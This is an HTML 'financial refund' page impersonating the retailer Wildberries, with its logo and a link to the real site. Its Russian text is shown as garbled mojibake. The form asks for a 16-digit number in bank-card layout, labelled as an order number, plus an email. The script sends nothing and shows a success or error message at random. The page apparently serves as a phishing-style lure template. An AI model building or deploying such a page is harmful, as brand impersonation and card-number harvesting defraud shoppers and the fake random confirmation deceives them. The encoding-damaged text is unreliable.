<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–§–∏–Ω–∞–Ω—Å–æ–≤—ã–π –≤–æ–∑–≤—Ä–∞—Ç</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f7f7f7;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    /* üîù –®–∞–ø–∫–∞ —Å —Ä–∞–±–æ—á–µ–π —Å—Å—ã–ª–∫–æ–π */
    header {
      width: 100%;
      background: #9b4dca;
      position: sticky;
      top: 0;
      z-index: 10;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
      text-align: center;
    }

    header .logo-link {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      color: white;
      text-decoration: none;
      font-size: 26px;
      font-weight: bold;
      padding: 18px;
      cursor: pointer;
      pointer-events: auto;
    }

    header .logo-link img {
      height: 32px;
      width: 32px;
      pointer-events: none;
    }

    header .logo-link span {
      pointer-events: none;
    }

    header .logo-link:hover {
      opacity: 0.85;
    }

    .container {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.15);
      width: 100%;
      max-width: 600px;
      text-align: center;
      box-sizing: border-box;
      margin: 30px auto;
      min-height: 70vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      opacity: 0;
      transform: scale(0.9);
      animation: fadeInScale 0.6s ease forwards;
    }

    @keyframes fadeInScale {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }

    .container h2 {
      color: #9b4dca;
      margin-bottom: 20px;
      font-size: 24px;
    }

    input, textarea, select {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
      box-sizing: border-box;
    }

    textarea {
      resize: vertical;
      min-height: 80px;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #9b4dca;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
      transition: 0.2s;
    }

    button:hover { background: #7a3ca3; }
    button:active { transform: scale(0.95); }

    .message { margin-top: 12px; font-size: 15px; font-weight: bold; }
    .error { color: red; }
    .success { color: green; }

    @media (max-width: 600px) {
      header .logo-link { font-size: 22px; padding: 14px; gap: 8px; }
      header .logo-link img { height: 26px; width: 26px; }
      .container { max-width: 95%; padding: 20px; min-height: 80vh; }
      .container h2 { font-size: 22px; }
      input, textarea, select { font-size: 16px; padding: 14px; }
      button { font-size: 18px; padding: 14px; }
    }
  </style>
</head>
<body>
  <!-- üîù –†–∞–±–æ—á–∞—è —à–∞–ø–∫–∞ —Å –ø–µ—Ä–µ—Ö–æ–¥–æ–º –Ω–∞ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —Å–∞–π—Ç -->
  <header>
    <a href="https://www.wildberries.ru/" target="_blank" class="logo-link">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Wildberries_logo.svg/512px-Wildberries_logo.svg.png" alt="logo">
      <span>WILDBERRIES</span>
    </a>
  </header>

  <div class="container">
    <h2>–§–∏–Ω–∞–Ω—Å–æ–≤—ã–π –≤–æ–∑–≤—Ä–∞—Ç</h2>
    <form id="refundForm">
      <input type="text" id="orderNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
      <input type="email" placeholder="Email –¥–ª—è —Å–≤—è–∑–∏" required>
      <select required>
        <option value="">–ü—Ä–∏—á–∏–Ω–∞ –≤–æ–∑–≤—Ä–∞—Ç–∞</option>
        <option>–¢–æ–≤–∞—Ä –Ω–µ –ø–æ–¥–æ—à—ë–ª</option>
        <option>–ë—Ä–∞–∫ –∏–ª–∏ –ø–æ–≤—Ä–µ–∂–¥–µ–Ω–∏–µ</option>
        <option>–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–∫–∞–∑–µ</option>
      </select>
      <textarea placeholder="–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π (–ø–æ –∂–µ–ª–∞–Ω–∏—é)"></textarea>
      <button type="submit">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∑–∞–ø—Ä–æ—Å</button>
    </form>
    <p class="message" id="formMessage"></p>
  </div>

  <script>
    // –ú–∞—Å–∫–∞ –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞ –∑–∞–∫–∞–∑–∞
    const orderInput = document.getElementById('orderNumber');

    orderInput.addEventListener('input', function(e) {
      let value = e.target.value.replace(/\D/g, ''); // –æ—Å—Ç–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã
      value = value.substring(0,16); // –º–∞–∫—Å–∏–º—É–º 16 —Ü–∏—Ñ—Ä
      const parts = value.match(/.{1,4}/g); // —Ä–∞–∑–±–∏–≤–∞–µ–º –Ω–∞ –±–ª–æ–∫–∏ –ø–æ 4
      e.target.value = parts ? parts.join(' ') : '';
    });

    // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–æ—Ä–º—ã
    const form = document.getElementById('refundForm');
    const formMessage = document.getElementById('formMessage');

    form.addEventListener('submit', function(event) {
      event.preventDefault();

      const success = Math.random() > 0.3; // 70% —É—Å–ø–µ—Ö–∞

      if (success) {
        formMessage.textContent = "‚úÖ –ó–∞—è–≤–∫–∞ –ø—Ä–∏–Ω—è—Ç–∞! –ú—ã —Å–≤—è–∂–µ–º—Å—è —Å –≤–∞–º–∏.";
        formMessage.className = "message success";
        form.reset();
      } else {
        formMessage.textContent = "‚ùå –û—à–∏–±–∫–∞! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑ –ø–æ–∑–∂–µ.";
        formMessage.className = "message error";
      }
    });
  </script>
</body>
</html>
